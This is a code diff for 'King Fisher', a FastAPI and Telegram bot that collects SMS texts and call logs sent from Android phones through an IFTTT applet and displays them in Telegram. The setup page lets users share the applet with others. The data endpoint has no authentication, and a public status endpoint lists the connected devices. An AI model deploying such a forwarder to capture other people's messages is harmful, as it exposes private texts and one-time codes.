@@ -13,7 +13,7 @@ Deployment: Render, Heroku, or any FastAPI-compatible platform
 import os
 import logging
 from contextlib import asynccontextmanager
-from typing import Dict, List
+from typing import Dict, List, Optional
 from datetime import datetime
 
 from fastapi import FastAPI, Request, Header, HTTPException
@@ -48,7 +48,7 @@ DEVICE_DATA = {
     "sms": {},          # device_id -> list of SMS
     "calls": {},        # device_id -> list of calls
     "devices": set(),   # device_id গুলোর সেট
-    "device_names": {}  # device_id -> device_name (NEW)
+    "device_names": {}  # device_id -> device_name
 }
 MAX_HISTORY = 100
 
@@ -81,6 +81,16 @@ class DeviceDataManager:
         ]
     
     @staticmethod
+    def get_device_details(device_id: str) -> Dict:
+        """একটি ডিভাইসের বিস্তারিত তথ্য ফেরত দিন"""
+        return {
+            "id": device_id,
+            "name": DeviceDataManager.get_device_name(device_id),
+            "sms_count": len(DEVICE_DATA["sms"].get(device_id, [])),
+            "call_count": len(DEVICE_DATA["calls"].get(device_id, [])),
+        }
+    
+    @staticmethod
     def store_sms(device_id: str, sms_list: List[Dict], device_name: str = None):
         if device_id not in DEVICE_DATA["sms"]:
             DEVICE_DATA["sms"][device_id] = []
@@ -88,12 +98,10 @@ class DeviceDataManager:
         for sms in sms_list:
             sms_id = sms.get("id")
             if sms_id:
-                # Avoid duplicates
                 existing = [s for s in DEVICE_DATA["sms"][device_id] if s.get("id") == sms_id]
                 if not existing:
                     DEVICE_DATA["sms"][device_id].append(sms)
         
-        # Keep only recent items
         DEVICE_DATA["sms"][device_id] = DEVICE_DATA["sms"][device_id][-MAX_HISTORY:]
         DeviceDataManager.register_device(device_id, device_name)
 
@@ -137,6 +145,7 @@ class DeviceDataManager:
 
 # ============ UI COMPONENTS ============
 def main_menu():
+    """মেইন মেনু বাটন"""
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("📦 SYSTEM ITEMS", callback_data="items")],
         [
@@ -150,16 +159,19 @@ def main_menu():
     ])
 
 def items_menu():
+    """আইটেম মেনু বাটন"""
     return InlineKeyboardMarkup([
         [
             InlineKeyboardButton("📩 SMS INBOX", callback_data="sms"),
             InlineKeyboardButton("📞 CALL LIST", callback_data="call"),
         ],
         [InlineKeyboardButton("📊 SYSTEM STATUS", callback_data="status")],
+        [InlineKeyboardButton("📱 DEVICES", callback_data="devices")],
         [InlineKeyboardButton("🔙 BACK TO MAIN", callback_data="back")],
     ])
 
 def back_menu():
+    """ব্যাক বাটন"""
     return InlineKeyboardMarkup([
         [InlineKeyboardButton("🔙 BACK TO MAIN", callback_data="back")]
     ])
@@ -193,9 +205,10 @@ Thank you for using <b>King Fisher</b>.
 HELP = """<b>❓ KING FISHER — HELP</b>
 
 📦 <b>System Items</b> — View real SMS/Call logs
+📱 <b>Devices</b> — View connected devices
 🔄 <b>Restart</b> — Refresh interface
 🔒 <b>Close</b> — Close current interface
-📊 <b>Status</b> — Show connected devices and stats
+📊 <b>Status</b> — Show system statistics
 
 <i>Data is collected in real-time from your Android device.</i>"""
 
@@ -264,7 +277,6 @@ def format_realtime_calls(call_list: List[Dict]) -> str:
         
         icon = icons.get(call_type, "📞")
         
-        # Format duration
         duration_str = "0s"
         if duration.isdigit():
             dur = int(duration)
@@ -285,12 +297,18 @@ def format_realtime_calls(call_list: List[Dict]) -> str:
     return "\n".join(lines)
 
 def format_status(stats: Dict, devices: List[Dict]) -> str:
-    """Status message with device names"""
-    device_lines = []
-    for dev in devices:
-        # নাম ছোট করে দেখান যদি খুব বড় হয়
-        display_name = dev['name'][:30] + '...' if len(dev['name']) > 30 else dev['name']
-        device_lines.append(f"   • {display_name}")
+    """স্ট্যাটাসে ডিভাইসের নাম ও আইডি দেখাবে"""
+    if not devices:
+        device_lines = ["   • No device connected"]
+    else:
+        device_lines = []
+        for dev in devices:
+            name = dev['name'][:30] + '...' if len(dev['name']) > 30 else dev['name']
+            device_lines.append(f"   🟢 <b>{name}</b>")
+            device_lines.append(f"      🆔 {dev['id'][:16]}...")
+            sms_count = len(DEVICE_DATA["sms"].get(dev['id'], []))
+            call_count = len(DEVICE_DATA["calls"].get(dev['id'], []))
+            device_lines.append(f"      📩 {sms_count} SMS • 📞 {call_count} Calls")
     
     return f"""<b>📊 SYSTEM STATUS</b>
 
@@ -305,9 +323,341 @@ def format_status(stats: Dict, devices: List[Dict]) -> str:
 📊 <b>Total Records:</b> {stats['total']}
 
 🔗 <b>Active Devices:</b>
-{chr(10).join(device_lines) if device_lines else '   • None'}
+{chr(10).join(device_lines)}
 ━━━━━━━━━━━━━━━━━━
 <i>Real-time data from Android devices.</i>"""
+
+def format_device_info(devices: List[Dict]) -> str:
+    """ডিভাইসের বিস্তারিত তথ্য ফরম্যাট করে"""
+    if not devices:
+        return "📭 <b>No device connected</b>\n\n<i>Send data from your Android device first.</i>"
+    
+    lines = ["<b>📱 CONNECTED DEVICES</b>", "━━━━━━━━━━━━━━━━━━"]
+    
+    for dev in devices:
+        name = dev['name'][:25] + '...' if len(dev['name']) > 25 else dev['name']
+        lines.append(f"🟢 <b>{name}</b>")
+        lines.append(f"   🆔 {dev['id'][:20]}...")
+        lines.append(f"   📩 {dev.get('sms_count', 0)} SMS")
+        lines.append(f"   📞 {dev.get('call_count', 0)} Calls")
+        lines.append("")
+    
+    lines.append("━━━━━━━━━━━━━━━━━━")
+    lines.append(f"📊 <i>Total devices: {len(devices)}</i>")
+    return "\n".join(lines)
+
+# ============ COMMAND HANDLERS ============
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    name = update.effective_user.first_name or "User"
+    await update.message.reply_text(
+        OPENING.format(name=name),
+        parse_mode=ParseMode.HTML,
+        reply_markup=main_menu(),
+    )
+
+async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "<b>🔄 SYSTEM RESTARTED</b>\n\n"
+        "━━━━━━━━━━━━━━━━━━\n"
+        "🟢 Interface refreshed\n"
+        "🟢 Services ready\n"
+        "🟢 Session active\n"
+        "━━━━━━━━━━━━━━━━━━",
+        parse_mode=ParseMode.HTML,
+        reply_markup=main_menu(),
+    )
+
+async def close(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(CLOSING, parse_mode=ParseMode.HTML)
+
+async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        HELP,
+        parse_mode=ParseMode.HTML,
+        reply_markup=back_menu(),
+    )
+
+async def about(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        ABOUT,
+        parse_mode=ParseMode.HTML,
+        reply_markup=back_menu(),
+    )
+
+async def devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """সব ডিভাইসের তথ্য দেখাবে"""
+    devices_list = DeviceDataManager.get_devices_with_names()
+    
+    device_details = []
+    for dev in devices_list:
+        device_details.append(DeviceDataManager.get_device_details(dev["id"]))
+    
+    await update.message.reply_text(
+        format_device_info(device_details),
+        parse_mode=ParseMode.HTML,
+        reply_markup=back_menu(),
+    )
+
+# ============ CALLBACK HANDLER ============
+async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer()
+    d = q.data
+    
+    user_id = str(q.from_user.id)
+    device_id = f"device_{user_id}"
+    
+    if d == "items":
+        await q.edit_message_text(
+            "<b>📦 SYSTEM ITEMS</b>\n\n<i>Select a section:</i>",
+            parse_mode=ParseMode.HTML,
+            reply_markup=items_menu(),
+        )
+    elif d == "sms":
+        sms_data = DeviceDataManager.get_sms(device_id, 10)
+        await q.edit_message_text(
+            format_realtime_sms(sms_data),
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_menu(),
+        )
+    elif d == "call":
+        call_data = DeviceDataManager.get_calls(device_id, 10)
+        await q.edit_message_text(
+            format_realtime_calls(call_data),
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_menu(),
+        )
+    elif d == "status":
+        stats = DeviceDataManager.get_stats()
+        devices_list = DeviceDataManager.get_devices_with_names()
+        await q.edit_message_text(
+            format_status(stats, devices_list),
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_menu(),
+        )
+    elif d == "devices":
+        devices_list = DeviceDataManager.get_devices_with_names()
+        device_details = []
+        for dev in devices_list:
+            device_details.append(DeviceDataManager.get_device_details(dev["id"]))
+        await q.edit_message_text(
+            format_device_info(device_details),
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_menu(),
+        )
+    elif d == "restart":
+        await q.edit_message_text(
+            "<b>🔄 SYSTEM RESTARTED</b>\n\n"
+            "━━━━━━━━━━━━━━━━━━\n"
+            "🟢 Interface refreshed\n"
+            "🟢 Services ready\n"
+            "🟢 Session active\n"
+            "━━━━━━━━━━━━━━━━━━",
+            parse_mode=ParseMode.HTML,
+            reply_markup=main_menu(),
+        )
+    elif d == "close":
+        await q.edit_message_text(CLOSING, parse_mode=ParseMode.HTML)
+    elif d == "help":
+        await q.edit_message_text(
+            HELP, parse_mode=ParseMode.HTML, reply_markup=back_menu()
+        )
+    elif d == "about":
+        await q.edit_message_text(
+            ABOUT, parse_mode=ParseMode.HTML, reply_markup=back_menu()
+        )
+    elif d == "back":
+        # ✅ ব্যাক বাটন - নতুন মেসেজ পাঠাবে
+        name = q.from_user.first_name or "User"
+        await q.message.reply_text(
+            OPENING.format(name=name),
+            parse_mode=ParseMode.HTML,
+            reply_markup=main_menu(),
+        )
+        await q.message.delete()  # পুরানো মেসেজ ডিলিট করবে
+
+# ============ REGISTER HANDLERS ============
+telegram_app.add_handler(CommandHandler("start", start))
+telegram_app.add_handler(CommandHandler("restart", restart))
+telegram_app.add_handler(CommandHandler("close", close))
+telegram_app.add_handler(CommandHandler("help", help_cmd))
+telegram_app.add_handler(CommandHandler("about", about))
+telegram_app.add_handler(CommandHandler("devices", devices))
+telegram_app.add_handler(CallbackQueryHandler(callbacks))
+
+# ============ FASTAPI APP ============
+@asynccontextmanager
+async def lifespan(app: FastAPI):
+    """Application lifespan manager"""
+    # Startup
+    await telegram_app.initialize()
+    await telegram_app.start()
+    
+    webhook_url = f"{PUBLIC_URL}/telegram/webhook"
+    await telegram_app.bot.set_webhook(
+        url=webhook_url,
+        secret_token=WEBHOOK_SECRET or None,
+        drop_pending_updates=True,
+    )
+    logger.info("✅ Webhook configured: %s", webhook_url)
+    
+    yield
+    
+    # Shutdown
+    try:
+        await telegram_app.stop()
+        await telegram_app.shutdown()
+        logger.info("✅ Bot shut down successfully")
+    except Exception as e:
+        logger.error(f"❌ Shutdown error: {e}")
+
+app = FastAPI(
+    title="King Fisher Bot",
+    version="3.0.0",
+    description="Real-time SMS and Call Log Monitor",
+    lifespan=lifespan,
+)
+
+# ============ CORS MIDDLEWARE ============
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
+# ============ API ENDPOINTS ============
+@app.get("/")
+async def home():
+    """Root endpoint"""
+    return {
+        "status": "online",
+        "service": "King Fisher Bot",
+        "version": "3.0.0",
+        "mode": "Real Data",
+        "docs": "/docs",
+        "setup": "/ifttt-setup"
+    }
+
+@app.get("/health")
+async def health():
+    """Health check endpoint"""
+    stats = DeviceDataManager.get_stats()
+    return {
+        "status": "healthy",
+        "devices": stats["devices"],
+        "messages": stats["total"]
+    }
+
+@app.get("/ifttt-setup")
+async def ifttt_setup():
+    """IFTTT setup page"""
+    return HTMLResponse(content=IFTTT_SETUP_PAGE)
+
+@app.options("/device/data")
+async def options_device_data():
+    """Handle CORS preflight OPTIONS request"""
+    return JSONResponse(
+        status_code=200,
+        content={"message": "OK"},
+        headers={
+            "Access-Control-Allow-Origin": "*",
+            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
+            "Access-Control-Allow-Headers": "Content-Type, X-Device-ID, X-Secret-Key",
+        }
+    )
+
+@app.post("/device/data")
+async def receive_device_data(request: Request):
+    """
+    Endpoint for Android devices to send data
+    
+    Expected payload:
+    {
+        "device_id": "android_phone1",
+        "device_name": "Samsung Galaxy A52",
+        "type": "sms" | "call",
+        "data": [...],
+        "timestamp": "2024-01-01T12:00:00"
+    }
+    """
+    try:
+        data = await request.json()
+        device_id = data.get("device_id")
+        device_name = data.get("device_name", device_id)
+        data_type = data.get("type")
+        device_data = data.get("data", [])
+        
+        if not device_id:
+            raise HTTPException(status_code=400, detail="device_id required")
+        
+        DeviceDataManager.register_device(device_id, device_name)
+        
+        if data_type == "sms":
+            DeviceDataManager.store_sms(device_id, device_data, device_name)
+            logger.info(f"📩 Received {len(device_data)} SMS from {device_name} ({device_id})")
+        elif data_type == "call":
+            DeviceDataManager.store_calls(device_id, device_data, device_name)
+            logger.info(f"📞 Received {len(device_data)} calls from {device_name} ({device_id})")
+        else:
+            raise HTTPException(status_code=400, detail="Invalid data type")
+        
+        return {
+            "status": "ok",
+            "device": device_id,
+            "device_name": device_name,
+            "type": data_type,
+            "count": len(device_data)
+        }
+    
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"❌ Error receiving device data: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/telegram/webhook")
+async def webhook(
+    request: Request,
+    x_telegram_bot_api_secret_token: str | None = Header(default=None),
+):
+    """Telegram webhook endpoint"""
+    if WEBHOOK_SECRET and x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
+        raise HTTPException(status_code=403, detail="Invalid webhook secret")
+    
+    try:
+        data = await request.json()
+        update = Update.de_json(data, telegram_app.bot)
+        await telegram_app.process_update(update)
+        return {"ok": True}
+    except Exception as e:
+        logger.error(f"❌ Webhook error: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.get("/status")
+async def status():
+    """Status endpoint with device names"""
+    stats = DeviceDataManager.get_stats()
+    devices = DeviceDataManager.get_devices_with_names()
+    
+    device_details = []
+    for dev in devices:
+        device_details.append({
+            "id": dev["id"],
+            "name": dev["name"],
+            "sms_count": len(DEVICE_DATA["sms"].get(dev["id"], [])),
+            "call_count": len(DEVICE_DATA["calls"].get(dev["id"], [])),
+        })
+    
+    return {
+        "status": "online",
+        "devices": stats["devices"],
+        "sms": stats["sms"],
+        "calls": stats["calls"],
+        "total": stats["total"],
+        "device_list": device_details
+    }
 
 # ============ IFTTT SETUP PAGE HTML ============
 IFTTT_SETUP_PAGE = """
@@ -474,7 +824,6 @@ IFTTT_SETUP_PAGE = """
             <span class="badge">v3.0 • No Termux Required</span>
         </div>
 
-        <!-- Step 1: Install IFTTT -->
         <div class="step">
             <h3><span class="number">1</span> Install IFTTT App</h3>
             <p style="color:#888;font-size:13px;margin-bottom:12px;">
@@ -485,7 +834,6 @@ IFTTT_SETUP_PAGE = """
             </button>
         </div>
 
-        <!-- Step 2: Create Applet -->
         <div class="step">
             <h3><span class="number">2</span> Create Applet</h3>
             <p style="color:#888;font-size:13px;margin-bottom:12px;">
@@ -501,7 +849,6 @@ IFTTT_SETUP_PAGE = """
             </div>
         </div>
 
-        <!-- Step 3: Test -->
         <div class="step">
             <h3><span class="number">3</span> Test Connection</h3>
             <p style="color:#888;font-size:13px;margin-bottom:12px;">
@@ -515,7 +862,6 @@ IFTTT_SETUP_PAGE = """
             </div>
         </div>
 
-        <!-- Manual Code -->
         <div class="step" style="border-color: rgba(255,255,255,0.05);">
             <h3 style="color:#fff;">📝 Manual Setup Code</h3>
             <div class="code" id="manualCode">
@@ -526,6 +872,7 @@ Content-Type: application/json
 Body:
 {
   "device_id": "my_android_phone",
+  "device_name": "My Samsung Phone",
   "type": "sms",
   "data": [{
     "id": "{{OccurredAt}}",
@@ -540,7 +887,6 @@ Body:
             </button>
         </div>
 
-        <!-- Share -->
         <div class="step" style="border-color: rgba(255,255,255,0.05);">
             <h3 style="color:#fff;">📤 Share Setup</h3>
             <div class="row">
@@ -586,6 +932,7 @@ Body:
                         content_type: "application/json",
                         body: JSON.stringify({
                             device_id: DEVICE_ID,
+                            device_name: "My Samsung Phone",
                             type: "sms",
                             data: [{
                                 id: "{{OccurredAt}}",
@@ -657,7 +1004,7 @@ Body:
                 `2. Open setup: ${window.location.href}\n` +
                 `3. Or use manual code:\n` +
                 `URL: ${BOT_URL}/device/data\n` +
-                `Body: {"device_id":"${DEVICE_ID}","type":"sms","data":[{"id":"{{OccurredAt}}","sender":"{{FromNumber}}","body":"{{Text}}","timestamp":"{{OccurredAt}}"}]}`;
+                `Body: {"device_id":"${DEVICE_ID}","device_name":"My Samsung Phone","type":"sms","data":[{"id":"{{OccurredAt}}","sender":"{{FromNumber}}","body":"{{Text}}","timestamp":"{{OccurredAt}}"}]}`;
             
             if (navigator.share) {
                 navigator.share({
@@ -693,7 +1040,6 @@ Body:
             }
         }
 
-        // Auto-check on load
         document.addEventListener('DOMContentLoaded', () => {
             testBot();
         });
@@ -701,283 +1047,3 @@ Body:
 </body>
 </html>
 """
-
-# ============ COMMAND HANDLERS ============
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    name = update.effective_user.first_name or "User"
-    await update.message.reply_text(
-        OPENING.format(name=name),
-        parse_mode=ParseMode.HTML,
-        reply_markup=main_menu(),
-    )
-
-async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "<b>🔄 SYSTEM RESTARTED</b>\n\n"
-        "━━━━━━━━━━━━━━━━━━\n"
-        "🟢 Interface refreshed\n"
-        "🟢 Services ready\n"
-        "🟢 Session active\n"
-        "━━━━━━━━━━━━━━━━━━",
-        parse_mode=ParseMode.HTML,
-        reply_markup=main_menu(),
-    )
-
-async def close(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(CLOSING, parse_mode=ParseMode.HTML)
-
-async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        HELP,
-        parse_mode=ParseMode.HTML,
-        reply_markup=back_menu(),
-    )
-
-async def about(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        ABOUT,
-        parse_mode=ParseMode.HTML,
-        reply_markup=back_menu(),
-    )
-
-# ============ CALLBACK HANDLER ============
-async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    await q.answer()
-    d = q.data
-    
-    # Map user to device (one device per user)
-    user_id = str(q.from_user.id)
-    device_id = f"device_{user_id}"
-    
-    if d == "items":
-        await q.edit_message_text(
-            "<b>📦 SYSTEM ITEMS</b>\n\n<i>Select a section:</i>",
-            parse_mode=ParseMode.HTML,
-            reply_markup=items_menu(),
-        )
-    elif d == "sms":
-        sms_data = DeviceDataManager.get_sms(device_id, 10)
-        await q.edit_message_text(
-            format_realtime_sms(sms_data),
-            parse_mode=ParseMode.HTML,
-            reply_markup=back_menu(),
-        )
-    elif d == "call":
-        call_data = DeviceDataManager.get_calls(device_id, 10)
-        await q.edit_message_text(
-            format_realtime_calls(call_data),
-            parse_mode=ParseMode.HTML,
-            reply_markup=back_menu(),
-        )
-    elif d == "status":
-        stats = DeviceDataManager.get_stats()
-        devices = DeviceDataManager.get_devices_with_names()
-        await q.edit_message_text(
-            format_status(stats, devices),
-            parse_mode=ParseMode.HTML,
-            reply_markup=back_menu(),
-        )
-    elif d == "restart":
-        await q.edit_message_text(
-            "<b>🔄 SYSTEM RESTARTED</b>\n\n"
-            "━━━━━━━━━━━━━━━━━━\n"
-            "🟢 Interface refreshed\n"
-            "🟢 Services ready\n"
-            "🟢 Session active\n"
-            "━━━━━━━━━━━━━━━━━━",
-            parse_mode=ParseMode.HTML,
-            reply_markup=main_menu(),
-        )
-    elif d == "close":
-        await q.edit_message_text(CLOSING, parse_mode=ParseMode.HTML)
-    elif d == "help":
-        await q.edit_message_text(
-            HELP, parse_mode=ParseMode.HTML, reply_markup=back_menu()
-        )
-    elif d == "about":
-        await q.edit_message_text(
-            ABOUT, parse_mode=ParseMode.HTML, reply_markup=back_menu()
-        )
-    elif d == "back":
-        name = q.from_user.first_name or "User"
-        await q.edit_message_text(
-            OPENING.format(name=name),
-            parse_mode=ParseMode.HTML,
-            reply_markup=main_menu(),
-        )
-
-# ============ REGISTER HANDLERS ============
-telegram_app.add_handler(CommandHandler("start", start))
-telegram_app.add_handler(CommandHandler("restart", restart))
-telegram_app.add_handler(CommandHandler("close", close))
-telegram_app.add_handler(CommandHandler("help", help_cmd))
-telegram_app.add_handler(CommandHandler("about", about))
-telegram_app.add_handler(CallbackQueryHandler(callbacks))
-
-# ============ FASTAPI APP ============
-@asynccontextmanager
-async def lifespan(app: FastAPI):
-    """Application lifespan manager"""
-    # Startup
-    await telegram_app.initialize()
-    await telegram_app.start()
-    
-    webhook_url = f"{PUBLIC_URL}/telegram/webhook"
-    await telegram_app.bot.set_webhook(
-        url=webhook_url,
-        secret_token=WEBHOOK_SECRET or None,
-        drop_pending_updates=True,
-    )
-    logger.info("✅ Webhook configured: %s", webhook_url)
-    
-    yield
-    
-    # Shutdown
-    try:
-        await telegram_app.stop()
-        await telegram_app.shutdown()
-        logger.info("✅ Bot shut down successfully")
-    except Exception as e:
-        logger.error(f"❌ Shutdown error: {e}")
-
-app = FastAPI(
-    title="King Fisher Bot",
-    version="3.0.0",
-    description="Real-time SMS and Call Log Monitor",
-    lifespan=lifespan,
-)
-
-# ============ ✅ CORS MIDDLEWARE ============
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],  # সব Origin থেকে অনুমতি
-    allow_credentials=True,
-    allow_methods=["*"],  # সব Method (GET, POST, OPTIONS, ইত্যাদি)
-    allow_headers=["*"],  # সব Header
-)
-
-# ============ API ENDPOINTS ============
-@app.get("/")
-async def home():
-    """Root endpoint"""
-    return {
-        "status": "online",
-        "service": "King Fisher Bot",
-        "version": "3.0.0",
-        "mode": "Real Data",
-        "docs": "/docs",
-        "setup": "/ifttt-setup"
-    }
-
-@app.get("/health")
-async def health():
-    """Health check endpoint"""
-    stats = DeviceDataManager.get_stats()
-    return {
-        "status": "healthy",
-        "devices": stats["devices"],
-        "messages": stats["total"]
-    }
-
-@app.get("/ifttt-setup")
-async def ifttt_setup():
-    """IFTTT setup page"""
-    return HTMLResponse(content=IFTTT_SETUP_PAGE)
-
-@app.options("/device/data")
-async def options_device_data():
-    """Handle CORS preflight OPTIONS request"""
-    return JSONResponse(
-        status_code=200,
-        content={"message": "OK"},
-        headers={
-            "Access-Control-Allow-Origin": "*",
-            "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
-            "Access-Control-Allow-Headers": "Content-Type, X-Device-ID, X-Secret-Key",
-        }
-    )
-
-@app.post("/device/data")
-async def receive_device_data(request: Request):
-    """
-    Endpoint for Android devices to send data
-    
-    Expected payload:
-    {
-        "device_id": "android_phone1",
-        "device_name": "Samsung Galaxy A52",  # Optional
-        "type": "sms" | "call",
-        "data": [...],
-        "timestamp": "2024-01-01T12:00:00"
-    }
-    """
-    try:
-        data = await request.json()
-        device_id = data.get("device_id")
-        device_name = data.get("device_name", device_id)  # NEW: device_name from HTML
-        data_type = data.get("type")
-        device_data = data.get("data", [])
-        
-        if not device_id:
-            raise HTTPException(status_code=400, detail="device_id required")
-        
-        # Register device with name
-        DeviceDataManager.register_device(device_id, device_name)
-        
-        if data_type == "sms":
-            DeviceDataManager.store_sms(device_id, device_data, device_name)
-            logger.info(f"📩 Received {len(device_data)} SMS from {device_name} ({device_id})")
-        elif data_type == "call":
-            DeviceDataManager.store_calls(device_id, device_data, device_name)
-            logger.info(f"📞 Received {len(device_data)} calls from {device_name} ({device_id})")
-        else:
-            raise HTTPException(status_code=400, detail="Invalid data type")
-        
-        return {
-            "status": "ok",
-            "device": device_id,
-            "device_name": device_name,
-            "type": data_type,
-            "count": len(device_data)
-        }
-    
-    except HTTPException:
-        raise
-    except Exception as e:
-        logger.error(f"❌ Error receiving device data: {e}")
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.post("/telegram/webhook")
-async def webhook(
-    request: Request,
-    x_telegram_bot_api_secret_token: str | None = Header(default=None),
-):
-    """Telegram webhook endpoint"""
-    if WEBHOOK_SECRET and x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
-        raise HTTPException(status_code=403, detail="Invalid webhook secret")
-    
-    try:
-        data = await request.json()
-        update = Update.de_json(data, telegram_app.bot)
-        await telegram_app.process_update(update)
-        return {"ok": True}
-    except Exception as e:
-        logger.error(f"❌ Webhook error: {e}")
-        raise HTTPException(status_code=500, detail=str(e))
-
-# ============ STATUS ENDPOINT ============
-@app.get("/status")
-async def status():
-    """Status endpoint with device names"""
-    stats = DeviceDataManager.get_stats()
-    devices = DeviceDataManager.get_devices_with_names()
-    
-    return {
-        "status": "online",
-        "devices": stats["devices"],
-        "sms": stats["sms"],
-        "calls": stats["calls"],
-        "total": stats["total"],
-        "device_list": devices
-    }
